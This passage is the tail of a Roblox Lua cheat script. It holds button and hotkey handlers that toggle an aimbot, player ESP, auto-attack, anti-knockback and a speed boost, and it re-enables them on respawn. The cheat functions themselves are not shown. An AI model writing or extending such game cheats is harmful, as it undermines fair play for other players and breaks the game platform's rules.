		AntiKBBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 255)
		startAntiKB()
	else
		ASound:Play()
		AntiKBBtn.Text = "💪 ANTI-KB : OFF"
		AntiKBBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		if antiKBConnection then
			antiKBConnection:Disconnect()
			antiKBConnection = nil
		end
	end
end)

ESPBtn.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled

	if espEnabled then
		OnSound:Play()
		ESPBtn.Text = "🟢 PLAYER ESP : ON"
		ESPBtn.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
		toggleESP()
	else
		ASound:Play()
		ESPBtn.Text = "👁️ PLAYER ESP : OFF"
		ESPBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		toggleESP()
	end
end)

-- ================= KEYBOARD SHORTCUTS =================
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.R then
		attacking = not attacking

		if attacking then
			OnSound:Play()
			Button.Text = "🟢 AUTO BAT : ON"
			Button.BackgroundColor3 = Color3.fromRGB(50, 200, 120)
			autoAttack()
		else
			ASound:Play()
			Button.Text = "🔴 AUTO BAT : OFF"
			Button.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
		end
	end

	if input.KeyCode == Enum.KeyCode.T then
		aimbotEnabled = not aimbotEnabled

		if aimbotEnabled then
			OnSound:Play()
			AimbotBtn.Text = "🟢 AIMBOT : ON"
			AimbotBtn.BackgroundColor3 = Color3.fromRGB(250, 150, 50)
			startBodyAimbot()
		else
			ASound:Play()
			AimbotBtn.Text = "🎯 AIMBOT : OFF"
			AimbotBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
			stopBodyAimbot()
		end
	end
end)

-- ================= RESPAWN HANDLER =================
player.CharacterAdded:Connect(function(char)
	task.wait(1)
	
	if spinEnabled then
		startSpin()
	end
	
	if aimbotEnabled then
		task.wait(0.5)
		startBodyAimbot()
	end
	
	if jumpBoostEnabled then
		applyJumpBoost()
	end
	
	if antiKnockbackEnabled then
		startAntiKB()
	end
end)

-- Update speed button text based on mode
RunService.RenderStepped:Connect(function()
	if speedEnabled and player.Character then
		local isStealing = player:GetAttribute("Stealing")
		if isStealing then
			SpeedBtn.Text = "🔴 STEALING (30)"
			SpeedBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
		else
			SpeedBtn.Text = "🟢 BOOSTING (56.5)"
			SpeedBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
		end
	end
end)

print("DyHZ Script Loaded Successfully!")